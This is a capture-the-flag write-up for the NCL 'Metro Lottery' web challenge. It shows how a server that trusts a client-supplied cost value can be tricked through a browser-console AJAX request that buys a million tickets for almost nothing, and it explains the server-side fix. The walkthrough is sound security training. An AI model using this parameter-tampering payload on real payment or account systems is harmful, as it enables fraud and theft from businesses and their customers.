# Web Application Medium - Metro Lottery

> **Category:** Web Application Exploitation
> **Difficulty:** Medium
> **NCL Section:** Gymnasium

---

## 🎯 Objective

Players of the Metropolis online lottery are winning at a statistically impossible rate. Conduct a security audit to find out why, and exploit the same vulnerability to win the lottery yourself.

> ⚠️ **Scope:** HTTPS only. Do not attack other ports and do not brute force the server.

> 🚨 **The flag is dynamically generated.** Every player gets a unique flag. It follows the standard `SKY-XXXX-XXXX` format.

---

## 🔗 Challenge URL

```
https://0cc9748b274996ae7e088a9b65b0163a-metro-lottery.web.cityinthe.cloud/
```

---

## 🛠️ Tools Needed

- **Firefox** (recommended) or any modern browser
- Browser Developer Tools (F12)
- The Metro Lottery challenge URL above

---

## 📚 Background: Trusted Client Input

This challenge demonstrates one of the most common web vulnerabilities: **trusting data sent by the client**.

When you buy lottery tickets, your browser sends a request to the server with the number of tickets and their cost. The problem is the server blindly trusts whatever cost value you send. If you tell the server the tickets cost $0.00001 each, it believes you. This means you can buy millions of tickets for almost nothing, rigging the odds completely in your favor.

You have a small balance to start with. Spending all of it legitimately gives you roughly a 3.85% win chance. You need over 80% to win. The math doesn't work honestly, so you have to cheat the math.

---

## 📋 Step-by-Step Walkthrough

### Step 1 - Open the Challenge and Inspect the Network Request

Open the challenge URL in a new Firefox window:

```
https://0cc9748b274996ae7e088a9b65b0163a-metro-lottery.web.cityinthe.cloud/
```

Press **F12** to open Developer Tools and click the **Network** tab.

Make a small legitimate purchase of any number of tickets. Watch the Network tab, a request to `/purchase` will appear. Click on it and look at the **Request Payload** or **Request Body**.

You'll see it sends something like:

```json
{
  "cost": 5,
  "tickets": 1
}
```

The server trusts both values. That's the vulnerability.

---

### Step 2 - Review the JavaScript Source

In Developer Tools, go to the **Sources** tab and find `main.js`. Look at the purchase function:

```javascript
$.ajax({
  method : 'POST',
  url : '/purchase' + window.location.search,
  data : JSON.stringify({
    cost : session.cost * tickets,
    tickets : tickets
  }),
  dataType : 'json',
  contentType : 'application/json',
  complete: getUpdate,
});
```

The `cost` field is calculated client-side and sent to the server. The server never independently verifies the cost. You can send any number you want.

---

### Step 3 - Exploit the Vulnerability

Go to the **Console** tab in Developer Tools and run this command directly:

```javascript
$.ajax({
  method : 'POST',
  url : '/purchase',
  data : JSON.stringify({
    cost : 5,
    tickets : 1000000,
  }),
  dataType : 'json',
  contentType : 'application/json'
});
```

This tells the server you want to buy **1,000,000 tickets** for a total cost of only **5**. The server believes you.

> ⚠️ **Notice what's missing:** The `complete` field has been removed. That field calls a function after the server responds and is not needed here. Including it may cause errors.

> 💡 **Use `/purchase` as the URL**, not `/purchase` + the full UID query string. Keep it simple.

---

### Step 4 - Wait for the Flag

After running the command, wait a few seconds for the current lottery round to end. The flag will appear on the page automatically once your win percentage exceeds 80%.

> 💡 If nothing happens after 10-15 seconds, refresh the page and check if the win percentage updated. You may need to run the command again.

---

## 💡 Hints (Without Giving It Away)

- **The vulnerability:** The server trusts the `cost` value sent by your browser. Send a tiny cost with a huge number of tickets.
- **The exploit:** Copy the AJAX request from the Sources tab, paste it into the Console, and change `cost` to something tiny and `tickets` to something enormous.
- **The trigger:** Win percentage must exceed 80%. One million tickets should do it comfortably.
- **The wait:** After running the command, the flag appears at the end of the current round. Be patient for a few seconds.

---

## ⚠️ Accuracy Tips

- ❌ **Don't include the `complete` field** in your console command. Remove it before running.
- ❌ **Don't compare flags with teammates.** The flag is unique to each player.
- ❌ **Don't forget to wait** after running the command. The round has to end before the flag appears.
- ✅ **Use `/purchase` as the URL** in the console command, not the full URL with query parameters.
- ✅ **Flag format is `SKY-XXXX-XXXX`** as usual. It will appear on the page once you win.

---

## 🧠 Why This Works

This vulnerability is called **parameter tampering** or **mass assignment** and it's shockingly common in real applications. Any time a server accepts values from a client and uses them for financial or security-sensitive calculations without re-validating them server-side, the door is wide open for this kind of attack. The fix is simple: the server should calculate the cost itself based on the number of tickets, never trusting the cost value sent by the client. Real-world examples of this vulnerability have allowed attackers to purchase products for $0, change account balances, and escalate privileges. In bug bounty programs, finding this on a financial application is often a critical severity finding worth significant rewards.

---

## 🔗 Resources

- [NCL Metro Lottery Tutorial Video](https://www.youtube.com/watch?v=q2XAIR8lJ7w&t=1067s)
- [OWASP - Mass Assignment](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/20-Testing_for_Mass_Assignment)
- [AJAX - Wikipedia](https://en.wikipedia.org/wiki/Ajax_(programming))

---

*Written by: Mo | Last updated: March 2026*
